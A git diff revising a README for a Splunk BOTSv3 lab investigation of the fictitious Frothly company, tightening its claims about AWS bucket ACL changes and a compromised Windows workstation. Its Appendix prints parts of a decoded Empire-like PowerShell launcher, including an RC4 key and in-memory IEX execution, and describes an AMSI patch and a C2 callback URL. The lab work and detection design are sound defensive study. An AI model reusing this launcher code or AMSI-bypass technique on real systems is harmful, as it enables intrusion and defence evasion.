@@ -3,27 +3,30 @@
 > Educational lab using Splunk's public BOTSv3 dataset. This is not a real
 > incident; "Frothly" is the fictitious company built into the dataset.
 > Investigation performed independently in a self-hosted Splunk Enterprise
-> (Docker) instance. See **Limitations** for where a public walkthrough was
-> consulted, and for a data-quality issue discovered during the work.
+> (Docker) instance. See **Limitations** for data-quality issues and scope.
 
 ## Executive Summary
 
-Analysis of the BOTSv3 dataset (Splunk Enterprise, Docker, 2.8M events,
-102 sourcetypes) identified two related security incidents on Frothly's
-infrastructure, both occurring within roughly a 4.5-hour window on
-2018-08-20 (UTC). On the cloud side, the AWS user `bstoll` modified the
-ACL on the `frothlywebcode` S3 bucket twice from an IP address that, in
-the same window, was also used for a corporate VPN session under a
-different identity (`mkraeusen`) — a pattern consistent with either
-shared office egress or credential/session reuse. On the endpoint side, a
-Windows workstation (`FYODOR-L`) was compromised via a browser-delivered,
-AMSI-evading PowerShell Empire launcher; the attacker used a documented
-UAC-bypass technique (`fodhelper.exe`) to gain elevated privileges,
-created a backdoor local administrator account (`svcvnc`), and
-established command-and-control over HTTPS to `45.77.53.176`, with
-beacon traffic also observed from a second host (`ABUNGST-L`), indicating
-lateral spread. 13 ATT&CK techniques and 8 IOCs were extracted and mapped
-to 5 detection queries suitable for a production SIEM.
+This educational BOTSv3 review contains two investigation threads on the
+fictitious Frothly environment: AWS CloudTrail activity and Windows
+endpoint activity. The published telemetry confirms two PutBucketAcl
+events by the logged AWS identity bstoll, encoded PowerShell execution
+and local account/group changes on FYODOR-L, and network connections to
+45.77.53.176 from FYODOR-L and ABUNGST-L.
+
+The evidence does not establish that the bucket became public, that S3
+objects were read or exfiltrated, that bstoll's credentials were stolen,
+or that FYODOR-L caused a compromise on ABUNGST-L. The decoded script is
+Empire-like; exact framework/version attribution is unverified. The
+browser parent establishes the first observed endpoint execution, not a
+user click or download.
+
+The repo includes a calibrated evidence ledger at docs/evidence-ledger.md,
+production-minded detection designs at docs/detection-engineering.md,
+search hygiene at docs/search-hygiene.md, and a conditional response
+playbook at docs/response-playbook.md. These searches and fixtures are
+proposed artifacts; they have not been run against the BOTSv3 dataset or
+a Splunk ES instance.
 
 ## Methodology
 
@@ -39,245 +42,203 @@ to 5 detection queries suitable for a production SIEM.
 4. Followed a pivot loop for each finding: ask a question → write a
    query → record the result and a screenshot → extract a new IOC
    (IP/user/host) → pivot on that value across every sourcetype → repeat.
-5. Mapped confirmed findings to MITRE ATT&CK and wrote detections
-   (`queries/det-*.spl`) that would have caught each stage earlier.
+5. Mapped observations and hypotheses to MITRE ATT&CK and documented
+   candidate detections. The searches have not been replayed against the
+   dataset as part of this refactor.
 
-## Data Quality Note — Timezone Discrepancy
+## Data Quality Note — Timezone and Index Contamination
 
-Splunk's **Preferences → Time zone** was set to UTC at the start of the
-investigation (per the lab guide), but the Splunk web UI was found to be
-rendering `_time` in **America/New_York local time (UTC-4 / EDT)**
-instead. This was discovered by comparing a Sysmon event's UI-displayed
-`_time` against the unambiguous, `Z`-suffixed `TimeCreated SystemTime`
-field inside its raw XML — the two were offset by exactly 4 hours in
-every case checked.
+The original investigation saw a four-hour difference between the
+Splunk Web time display and the raw Sysmon XML TimeCreated SystemTime
+attribute. A UI timestamp is a rendering of the stored Unix _time and
+can be localized. That display difference alone does not prove that the
+stored event epoch is wrong. The earlier report added four hours to
+published timestamps, but did not package the epoch comparison needed to
+reproduce that correction.
 
-**All timestamps in this report have been corrected to true UTC** by
-adding 4 hours to the time originally shown in the Splunk UI. This does
-not change the relative order or spacing of events, only their absolute
-UTC label. This is called out explicitly because it is exactly the kind
-of environment-setup error that would silently skew a real incident
-timeline, and is captured as a lesson learned below.
+Run the raw SystemTime comparison in queries/search-hygiene.spl. Compare
+_time with the epoch parsed from the Z-suffixed XML timestamp. If they
+match, the four-hour shift is presentation-only and _time must not be
+changed. If the numeric delta is consistently four hours, investigate
+timestamp parsing before altering the event timeline. The timestamps
+below are the times published in the original report; retain them as
+reported pending this reproducible comparison.
 
-## Timeline (UTC, 2018-08-20)
+The Unix add-on also collected live Splunk-host command output into the
+botsv3 index and extended its apparent range. The exclusion macro in
+default/macros.conf scopes the reported TA-Nix sourcetypes; validate the
+sourcetype/host pairs and event counts before claiming the 1.94M-event
+baseline or applying the exclusion to all hosts.
 
-| Time (UTC) | Host / Actor | Event | Finding |
+## Timeline (times as published; UTC epoch validation pending)
+
+| Time | Host / actor | Observed event | Calibrated status |
 |---|---|---|---|
-| 09:16:12 | `web_admin` (IP 35.153.154.221) | `CreateUser` + `CreateAccessKey` attempted → **AccessDenied** | F1 |
-| 09:35:27 | `bstoll` (IP 157.97.121.132) | AWS Console login | F1 |
-| 09:46:22 | `mkraeusen` (IP 107.77.212.175) | VPN WebVPN session established (clean auth) | F1 |
-| 10:01:41 | `FYODOR-L` | `browser_broker.exe` spawns encoded PowerShell — initial access | F2 |
-| 10:07:06 | `FYODOR-L` | `fodhelper.exe` UAC bypass (1st instance) | F2 |
-| 10:08:17 | `FYODOR-L` | `net.exe` creates local account `svcvnc` (password `Password123!`) | F2 |
-| 10:08:35 | `FYODOR-L` | `svcvnc` added to local **Administrators** group | F2 |
-| 10:11:00 | `FYODOR-L` | Fileless execution via `IEX`, parent `svchost.exe` | F2 |
-| 10:15:27 | `FYODOR-L` | WMI-based execution, parent `WmiPrvSE.exe` | F2 |
-| 11:32:12 | `FYODOR-L` | `fodhelper.exe` UAC bypass (2nd instance) — payload downloaded via Edge, decoded and confirmed as a **PowerShell Empire** launcher | F2 |
-| 13:01:46 | `bstoll` (IP 107.77.212.175) | `PutBucketAcl` on bucket `frothlywebcode` | F1 |
-| 13:57:22 | `bstoll` (IP 107.77.212.175) | AWS Console login | F1 |
-| 13:57:54 | `bstoll` (IP 107.77.212.175) | `PutBucketAcl` on `frothlywebcode` (2nd change) | F1 |
-| — | `FYODOR-L` (3,849 conns) + `ABUNGST-L` (1,070 conns) | Sustained PowerShell beaconing to `45.77.53.176:443` (C2) | F2 |
+| 09:16:12 | web_admin, 35.153.154.221 | CreateUser and CreateAccessKey returned AccessDenied | [BLOCKED] |
+| 09:35:27 | bstoll, 157.97.121.132 | AWS ConsoleLogin logged for bstoll | [CONFIRMED] login event; account abuse unresolved |
+| 09:46:22 | mkraeusen, 107.77.212.175 | Cisco ASA WebVPN session logged | [CONFIRMED] session event |
+| 10:01:41 | FYODOR-L | browser_broker.exe parent observed for encoded PowerShell process | [CONFIRMED] execution; user interaction unproven |
+| 10:07:06 | FYODOR-L | fodhelper.exe process observed | [CONFIRMED] process; UAC bypass suspected |
+| 10:08:17 | FYODOR-L | net.exe command line created local account svcvnc | [CONFIRMED] account creation |
+| 10:08:35 | FYODOR-L | svcvnc added to local Administrators | [CONFIRMED] group change |
+| 10:11:00 | FYODOR-L | PowerShell IEX execution observed, parent svchost.exe | [CONFIRMED] execution |
+| 10:15:27 | FYODOR-L | WmiPrvSE.exe parent observed for execution | [CONFIRMED] local telemetry; remote target not established |
+| 11:32:12 | FYODOR-L | Encoded PowerShell and fodhelper.exe observed; decoded script has AMSI/logging tampering, RC4 and IEX behavior | [CONFIRMED] behavior; framework attribution unverified |
+| 13:01:46 | bstoll, 107.77.212.175 | PutBucketAcl on frothlywebcode | [CONFIRMED] ACL API call; public exposure unresolved |
+| 13:57:22 | bstoll, 107.77.212.175 | AWS ConsoleLogin logged for bstoll | [CONFIRMED] login event; account abuse unresolved |
+| 13:57:54 | bstoll, 107.77.212.175 | Second PutBucketAcl on frothlywebcode | [CONFIRMED] ACL API call; public exposure unresolved |
+| Not bounded in published timeline | FYODOR-L and ABUNGST-L | 3,849 and 1,070 network events to 45.77.53.176:443, respectively | [CONFIRMED] network telemetry; shared C2 does not prove host-to-host movement |
+
+The displayed times above preserve the original report's labels. The
+raw-to-epoch query is required before treating the UTC conversion as
+independently reproduced.
 
 ## Findings
 
-### F1 — Shared/reused IP across an AWS console session and a corporate VPN session
+### F1 — AWS identity and bucket ACL activity
 
-**What happened:** AWS user `bstoll` logged into the AWS Console and
-twice modified the ACL on the `frothlywebcode` S3 bucket, both times from
-IP `107.77.212.175`. In the same investigation window, that same IP was
-independently used for a Cisco ASA `AnyConnect`/WebVPN session
-authenticated as a *different* user, `mkraeusen`. A separate account,
-`web_admin`, also attempted to create a new IAM user and access key from
-a third IP (`35.153.154.221`) and was denied.
+CloudTrail records bstoll logging in and making two PutBucketAcl calls
+against frothlywebcode. The repo does not publish the exact
+Grantee.URI or a policy principal from either event, so public exposure
+is unresolved. No S3 object-level reads or exfiltration are shown.
+CloudTrail confirms the logged identity and API activity; it does not
+establish credential theft or malicious intent.
 
-**Why it matters:** Repeated ACL changes to a production bucket are
-exactly the kind of action that can silently flip a bucket from private
-to public. One external IP being used across two different identities
-and two different systems (AWS console + corporate VPN) is a pattern
-that needs to be resolved to either "same person, same office egress"
-(benign) or "shared/compromised credential" (not benign) — the
-dataset alone cannot fully distinguish the two, which is why this is
-flagged as high-priority rather than fully confirmed.
+The same IP address, 107.77.212.175, appears in a Cisco ASA WebVPN
+session for mkraeusen. This is a useful correlation pivot, but shared
+office/VPN egress and identity/session reuse remain alternatives.
 
-**Evidence:** `queries/q-a1-a4-cloudtrail.spl` (A1, A2), pivot queries
-on `107.77.212.175` across `cisco:asa` and `ms:o365:management`.
+### F2 — Endpoint execution and account changes
 
-**ATT&CK:** T1078 (Valid Accounts); T1136 (Create Account) for the
-denied `web_admin` attempt (suspected only — the action was blocked).
+On FYODOR-L, Sysmon process telemetry shows browser_broker.exe as the
+parent of encoded PowerShell, two fodhelper.exe executions, and
+PowerShell behaviors that include AMSI and ScriptBlock logging changes,
+RC4 decryption, and IEX. The exact user interaction behind the browser
+parent is unproven. The fodhelper process evidence makes UAC bypass
+plausible, but the ms-settings registry hijack and elevated token
+integrity are not published.
 
-**Not yet confirmed / next step:** whether the `PutBucketAcl` change
-actually granted `AllUsers` (public) access — the raw event's
-`requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Grantee.URI`
-field should be inspected directly to close this out.
+Windows telemetry records creation of local account svcvnc followed by
+addition to the local Administrators group. The actor and affected
+account are separate event fields and must be shown separately in any
+correlation. Network events show both FYODOR-L and ABUNGST-L connecting
+to 45.77.53.176:443. This establishes activity on two hosts, not a
+movement path from one to the other. The published evidence contains no
+Event ID 4624 Type 3, remote WMI target, SMB/RPC pipe, PsExec, or
+host-to-host transfer mechanism linking the hosts.
 
-### F2 — Full endpoint compromise of FYODOR-L via PowerShell Empire, with lateral spread
-
-**What happened:** Workstation `FYODOR-L` (user `AzureAD\FyodorMalteskesko`)
-was compromised through a browser-delivered payload. The attacker ran a
-heavily obfuscated, base64-encoded PowerShell launcher that:
-
-- Disabled AMSI (`amsiInitFailed = $true`) and PowerShell ScriptBlock
-  logging, blinding Defender/AMSI to what followed;
-- Called out over HTTPS to `https://45.77.53.176:443/admin/get.php`,
-  sending a fixed auth cookie (`PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=`)
-  and a spoofed IE11 User-Agent string;
-- Downloaded a payload and decrypted it in memory with a hardcoded RC4
-  key before executing it via `IEX` — this exact stub (the
-  version-check, AMSI patch, and RC4 decrypt-then-`IEX` pattern) is the
-  documented launcher used by the **PowerShell Empire** post-exploitation
-  framework (full decoded script in the Appendix).
-
-Using the elevated context gained via a `fodhelper.exe` UAC bypass (used
-twice, ~90 minutes apart), the attacker created a local account
-`svcvnc` with a weak hardcoded password (`Password123!`) and immediately
-added it to the local **Administrators** group — a backdoor account for
-persistent access. Sustained PowerShell network activity was then
-observed beaconing to the same C2 IP on port 443 from `FYODOR-L`
-(3,849 connections) and, critically, from a second host, `ABUNGST-L`
-(1,070 connections) — indicating the compromise spread beyond the
-initial foothold. Two additional binaries were found masquerading as
-legitimate Windows/IE components while running from `%TEMP%`
-(`DismHost.exe` in a GUID-named folder, and a misspelled `iexplorer.exe`
-under `Temp\unziped\lsof-master\`).
-
-**Why it matters:** This is a complete, evidence-backed kill chain from
-initial access through privilege escalation, persistence, defense
-evasion, and command-and-control, with confirmed lateral movement to a
-second host.
-
-**Evidence:** `queries/q-b1-b4-endpoint.spl` (B1–B4), full raw event and
-decoded payload in the Appendix.
-
-**ATT&CK:** see the table below — 10 techniques map directly to this
-finding.
+Use the evidence ledger for the event-level claim, ATT&CK status, and
+falsifier/next-pivot for every step.
 
 ## Indicators of Compromise (IOCs)
 
-| # | IOC | Type | Context |
-|---|---|---|---|
-| 1 | `45.77.53.176` | IP | C2 server (PowerShell Empire), beaconed to on port 443 |
-| 2 | `https://45.77.53.176:443/admin/get.php` | URL | Full C2 callback path |
-| 3 | `PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI=` | HTTP cookie value | C2 auth/session cookie used by the Empire agent |
-| 4 | `107.77.212.175` | IP | Shared between `bstoll` (AWS) and `mkraeusen` (VPN) sessions |
-| 5 | `35.153.154.221` | IP | Source of `web_admin`'s denied `CreateUser`/`CreateAccessKey` |
-| 6 | `svcvnc` / `Password123!` | Account | Backdoor local admin account created on FYODOR-L |
-| 7 | `DismHost.exe` (in `%TEMP%\<GUID>\`) | File | Masquerading as legitimate Windows component |
-| 8 | `iexplorer.exe` (in `Temp\unziped\lsof-master\`) | File | Misspelled masquerade of `iexplore.exe` |
+| IOC | Type | Context and confidence |
+|---|---|---|
+| 45.77.53.176:443 | IP/port | Network destination in PowerShell-related telemetry on two hosts; suspected C2, no independent infrastructure attribution |
+| https://45.77.53.176:443/admin/get.php | URL | URL embedded in decoded launcher behavior |
+| PthAVgs=bKQxpuOd5LPCjyfRC1BxPqQ8FWI= | HTTP cookie | Value in decoded script; do not treat as unique family attribution |
+| 107.77.212.175 | IP | CloudTrail bstoll and Cisco ASA mkraeusen records; shared egress versus identity misuse unresolved |
+| 35.153.154.221 | IP | Source of blocked CreateUser/CreateAccessKey attempt |
+| svcvnc | Local account | Account created and added to Administrators on FYODOR-L |
+| DismHost.exe in a Temp GUID path; iexplorer.exe in Temp/unziped/lsof-master | File/path | Masquerading indicators; no hashes are published |
+
+The repository does not publish file hashes or independent VirusTotal or
+abuse.ch enrichment. The password visible in the lab command line is
+omitted from this indicator table.
 
 ## MITRE ATT&CK Mapping
 
-| # | Finding | Tactic | Technique | ID | Confidence |
-|---|---|---|---|---|---|
-| 1 | `web_admin` CreateUser/CreateAccessKey denied | Persistence | Create Account | T1136 | Suspected (blocked, unconfirmed intent) |
-| 2 | `bstoll` PutBucketAcl via shared IP | Initial Access / Persistence | Valid Accounts | T1078 | Confirmed |
-| 3 | `browser_broker.exe` spawns encoded PowerShell | Execution | User Execution | T1204 | Confirmed |
-| 4 | Base64-encoded PowerShell launcher | Defense Evasion | Obfuscated Files or Information | T1027 | Confirmed |
-| 5 | `fodhelper.exe` spawned by elevated PowerShell | Privilege Escalation / Defense Evasion | Bypass User Account Control | T1548.002 | Confirmed |
-| 6 | AMSI bypass + ScriptBlock logging disabled | Defense Evasion | Impair Defenses | T1562.001 | Confirmed |
-| 7 | `net.exe` creates local account `svcvnc` | Persistence | Create Account: Local Account | T1136.001 | Confirmed |
-| 8 | `svcvnc` added to Administrators group | Privilege Escalation | Account Manipulation | T1098 | Confirmed |
-| 9 | PowerShell execution throughout | Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Confirmed |
-| 10 | `WmiPrvSE.exe` spawning PowerShell | Execution / Lateral Movement | Windows Management Instrumentation | T1047 | Confirmed |
-| 11 | RC4-encrypted payload download + `IEX` | Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Confirmed |
-| 12 | `DismHost.exe` / `iexplorer.exe` in Temp with legitimate-looking names | Defense Evasion | Masquerading | T1036 | Confirmed |
-| 13 | Beaconing from FYODOR-L **and** ABUNGST-L to the same C2 | Lateral Movement | (inferred from C2 spread) | — | Suspected |
+| Behavior | ATT&CK | Calibrated status |
+|---|---|---|
+| First observed PowerShell execution with browser_broker.exe parent | T1204 User Execution | [SUSPECTED / HYPOTHESIS] user click/download is unproven |
+| Encoded PowerShell and IEX | T1059.001 PowerShell; T1027 Obfuscated Files or Information | [CONFIRMED] process/decoded behavior |
+| fodhelper.exe execution | T1548.002 Bypass User Account Control | [SUSPECTED / HYPOTHESIS] ms-settings key and elevated token integrity unverified |
+| AMSI and ScriptBlock logging tampering | T1562.001 Impair Defenses | [CONFIRMED] decoded script behavior; resulting security-control state not separately verified |
+| svcvnc account created | T1136.001 Create Account: Local Account | [CONFIRMED] account-creation telemetry |
+| svcvnc added to local Administrators | T1098.007 Additional Local or Domain Groups | [CONFIRMED] only after confirming target SID/member and Administrators group |
+| bstoll CloudTrail activity | T1078 Valid Accounts | [SUSPECTED / HYPOTHESIS] logged identity is confirmed; adversary credential theft versus legitimate activity unresolved |
+| web_admin CreateUser/CreateAccessKey attempt | T1136.003 Create Account: Cloud Account | [BLOCKED] AccessDenied; no created account/key established |
+| PowerShell callback to 45.77.53.176 | T1071.001 Web Protocols | [CONFIRMED] network/script behavior; external control attribution remains an assessment |
+| WMI process parent on FYODOR-L | T1047 Windows Management Instrumentation | [CONFIRMED] WMI-related execution evidence; remote movement is not established |
+| C2 traffic from both hosts | No lateral movement ID asserted | [SUSPECTED / HYPOTHESIS] no causal host-to-host mechanism published |
+
+Do not map the shared C2 destination to T1021.002 SMB/Windows Admin Shares
+without SMB/admin-share telemetry connecting source and target.
 
 ## Detection Recommendations
 
-Each detection below was written from a confirmed finding, then tested
-against the full dataset to check trigger accuracy and false-positive
-rate. Full SPL, trigger conditions, and test results are in
-`queries/det-*.spl`.
+Three ES correlation-search designs with explicit schedules, late-data
+handling, RBA entities, thresholds, tuning and synthetic fixtures are in
+docs/detection-engineering.md:
 
-| # | Detection | Catches | ATT&CK |
-|---|---|---|---|
-| DET-01 | `queries/det-01-s3-public-acl.spl` | S3 bucket ACL changed to grant public (`AllUsers`) access | T1078 / T1098 |
-| DET-02 | `queries/det-02-empire-launcher.spl` | Base64-encoded PowerShell launcher, decodes it inline | T1027 / T1059.001 |
-| DET-03 | `queries/det-03-fodhelper-uac-bypass.spl` | `fodhelper.exe` spawned by PowerShell (UAC bypass) | T1548.002 |
-| DET-04 | `queries/det-04-local-admin-account-creation.spl` | New local account created and elevated to Administrators in one short window | T1136.001 / T1098 |
-| DET-05 | `queries/det-05-c2-beacon-volume.spl` | High-volume PowerShell beaconing to a single external IP/port | T1071.001 |
+1. Public S3 ACL or bucket policy change, using normalized public-grant
+   fields and an approved-public-bucket baseline.
+2. Local account creation followed by addition to Administrators,
+   correlated on target SID and separated actor fields.
+3. Suspicious PowerShell process creation followed by non-RFC1918
+   egress from the same ProcessGuid within ten minutes.
 
-## Containment / Eradication / Recovery
+The SPL uses schema prerequisites that must be validated against the
+Splunk Add-ons and CIM mappings in the deployment. The JSON fixtures are
+synthetic examples with expected outcomes; they have not been run in
+Splunk. Existing DET-02, DET-03 and DET-05 remain lab hunt examples
+until their schema, schedule, baseline and alert lifecycle are tested.
 
-If this were a live incident, the following actions follow directly
-from the findings above:
+## Response Playbook
 
-**Containment**
-- Isolate `FYODOR-L` and `ABUNGST-L` from the network (confirmed C2
-  beaconing hosts).
-- Disable the `svcvnc` local account on `FYODOR-L` immediately.
-- Rotate/disable the AWS access key and console credentials for `bstoll`
-  and `web_admin` pending investigation.
-- Block `45.77.53.176` at the perimeter firewall/proxy.
-
-**Eradication**
-- Remove `svcvnc` and audit all local groups on `FYODOR-L` for any other
-  unauthorized additions.
-- Remove `DismHost.exe` and `iexplorer.exe` from the identified Temp
-  paths; sweep the environment for the same file hashes/paths on other
-  hosts.
-- Revert the `frothlywebcode` bucket ACL to its known-good baseline and
-  enable S3 access logging + versioning if not already on.
-
-**Recovery**
-- Re-image `FYODOR-L` rather than trust a cleaned host, given confirmed
-  AMSI/logging tampering.
-- Force credential reset (password + MFA re-enrollment) for `bstoll`,
-  `web_admin`, and `mkraeusen`.
-- Deploy DET-01 through DET-05 as standing correlation searches before
-  reconnecting affected systems.
+The tailored AWS and endpoint response sequence is in
+docs/response-playbook.md. It aligns governance, response and recovery
+with NIST SP 800-61 Rev. 3 and CSF 2.0. All actions are recommendations
+for a live incident, not actions performed in this BOTSv3 lab. Steps
+that disable bstoll or remediate the bucket are conditional on evidence
+and incident commander approval because account compromise and public
+exposure are unresolved.
 
 ## Limitations
 
-- **Timezone discrepancy:** see the Data Quality Note above — the
-  Splunk UI rendered `_time` in America/New_York local time instead of
-  UTC for the duration of the investigation, despite the timezone
-  preference being set correctly. All timestamps in this report were
-  corrected by +4 hours; this is flagged rather than silently fixed so
-  the correction itself is auditable.
-- **Index contamination:** the `Splunk Add-on for Unix and Linux` was
-  installed as part of the standard add-on set and began collecting
-  live `ps`/`top`/`lsof`/`netstat`/`PerfmonMk:Process` data from the
-  Splunk host itself into the `botsv3` index. This inflated the raw
-  event count (1.94M → 2.84M) and added a spurious tail of events
-  through 2019. These sourcetypes were excluded from all findings and
-  from the "true" BOTSv3 timeline, which is concentrated entirely on
-  2018-08-20.
-- **Not fully confirmed:** whether the `PutBucketAcl` change on
-  `frothlywebcode` actually granted public access (the exact
-  `Grantee.URI` was not inspected directly), and whether the shared IP
-  in Finding 1 represents the same person on the same network or
-  credential reuse — both are called out as next steps above rather
-  than asserted.
-- **Scope:** only two directions (Cloud/AWS and Windows Endpoint) were
-  investigated in depth, per the lab's guidance to go deep rather than
-  broad; Office 365, Linux/osquery, and full DNS/HTTP stream data were
-  only pivoted into opportunistically, not hunted independently.
-- **Walkthrough usage:** no public BOTSv3 walkthrough was consulted
-  before or during this investigation; all queries, pivots, and
-  conclusions above were independently derived.
+- Timezone: the earlier report says it added four hours to displayed
+  timestamps. The package now supplies a raw SystemTime versus _time
+  epoch comparison; until that is run, the published UTC labels are not
+  independently reproduced.
+- Index contamination: local Unix add-on collection inflated the
+  observed index from 1.94M to 2.84M events and extended its apparent
+  date range. default/macros.conf excludes only documented TA-Nix
+  sourcetypes; run the inventory query to confirm they are collector
+  noise and not genuine BOTSv3 telemetry before relying on counts.
+- Evidence scope: public ACL grantee/policy, S3 object data events,
+  remote host-to-host movement, raw query exports, and file hashes are
+  not published.
+- Detection status: proposed correlation searches and fixtures are
+  unexecuted. Field aliases, lookup contents, CIM mapping, scheduler
+  behavior and false-positive rates require validation in a Splunk ES
+  deployment.
+- Scope: AWS and Windows received the deepest hunts; Office 365,
+  Linux/osquery, DNS and HTTP/SMB Stream were opportunistic pivots.
+- Provenance: this is a BOTSv3 lab project. The current commit history
+  and public answer material do not prove the research process, but no
+  evidence in this repo supports a plagiarism allegation.
 
 ## Repo Structure
 
-```
-botsv3-soc-investigation/
-├── README.md                              <- this report
-├── queries/
-│   ├── q00-orientation.spl                <- Step 4 dataset mapping
-│   ├── q-a1-a4-cloudtrail.spl             <- Direction A (Cloud/AWS)
-│   ├── q-b1-b4-endpoint.spl               <- Direction B (Windows Endpoint)
-│   ├── det-01-s3-public-acl.spl
-│   ├── det-02-empire-launcher.spl
-│   ├── det-03-fodhelper-uac-bypass.spl
-│   ├── det-04-local-admin-account-creation.spl
-│   └── det-05-c2-beacon-volume.spl
-└── img/                                   <- screenshots referenced above
-```
+The refactor adds:
 
-*(Dataset file `botsv3_data_set.tgz` intentionally not committed — see
-[splunk/botsv3](https://github.com/splunk/botsv3) to reproduce.)*
+~~~
+docs/evidence-ledger.md
+docs/detection-engineering.md
+docs/search-hygiene.md
+docs/response-playbook.md
+default/macros.conf
+queries/search-hygiene.spl
+queries/det-06-encoded-powershell-external-egress.spl
+tests/fixtures/det-01-{positive,negative}.json
+tests/fixtures/det-04-{positive,negative}.json
+tests/fixtures/det-06-{positive,negative}.json
+~~~
 
-## Appendix — Decoded PowerShell Empire Launcher
+The dataset archive remains uncommitted; see the Splunk BOTSv3 dataset
+repository for reproduction.
+
+## Appendix — Decoded Empire-like PowerShell launcher behavior
 
 Extracted from a `fodhelper.exe`-spawning PowerShell process on
 `FYODOR-L` (Sysmon EventCode 1, `CommandLine` containing `-enc`).
@@ -316,7 +277,7 @@ $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
 $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 $Script:Proxy = $wc.Proxy
 
-# RC4 key + implementation (Empire's standard stager RC4)
+# RC4 key and implementation present in the decoded script
 $K = [System.Text.Encoding]::ASCII.GetBytes('1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP')
 $R = {
     $D, $K = $ARGS
@@ -335,9 +296,9 @@ $datA = $datA[4..($datA.Length)]
 ```
 
 **What it does, in order:**
-1. Disables PowerShell ScriptBlock logging and patches
-   `AmsiUtils.amsiInitFailed = $true`, blinding AMSI/Defender to
-   everything that follows.
+1. Attempts to modify PowerShell ScriptBlock logging settings and set
+   `AmsiUtils.amsiInitFailed = $true`; resulting endpoint control state
+   was not independently verified.
 2. Configures a `WebClient` with a spoofed IE11 User-Agent and disables
    TLS certificate validation.
 3. Requests `https://45.77.53.176:443/admin/get.php` with a fixed
@@ -346,7 +307,7 @@ $datA = $datA[4..($datA.Length)]
    from the start of the response, then pipes the decrypted stage-2
    payload directly into `IEX` for in-memory execution.
 
-This is the documented launcher stub used by the **PowerShell Empire**
-post-exploitation framework (or a close derivative) — the version-gate,
-AMSI patch, and RC4-decrypt-then-`IEX` sequence are its signature
-pattern, not custom-written malware.
+The decoded behavior is Empire-like. The exact framework and version are
+unverified without a sample hash and an independent comparison to a
+primary framework source. Similar launcher behavior is not unique
+attribution.
